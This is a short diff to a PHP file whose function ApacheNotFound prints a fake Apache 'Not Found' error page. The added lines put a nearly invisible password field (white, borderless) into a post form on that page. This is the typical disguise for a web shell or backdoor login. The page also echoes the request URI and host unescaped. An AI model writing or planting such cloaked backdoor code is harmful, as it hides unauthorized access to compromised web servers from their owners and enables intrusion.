@@ -28,11 +28,17 @@
   >>>>>>>>>>>>>>>>> */
   function ApacheNotFound() {
     ?>
-
+  
     <h1>Not Found</h1>
     <p>The request URL <?=dirname($_SERVER['REQUEST_URI'])?> was not found on this server.</p>
     <hr>
     <address>Apache Server at <?=$_SERVER['HTTP_HOST']?> Port <?=$_SERVER['SERVER_PORT']?></address>
+
+    <center>
+      <form method="post">
+        <input style="margin:0;background-color:#fff;border:0px" type="password" name="passwd">
+      </form>
+    </center>
 
     <?php exit;
   }
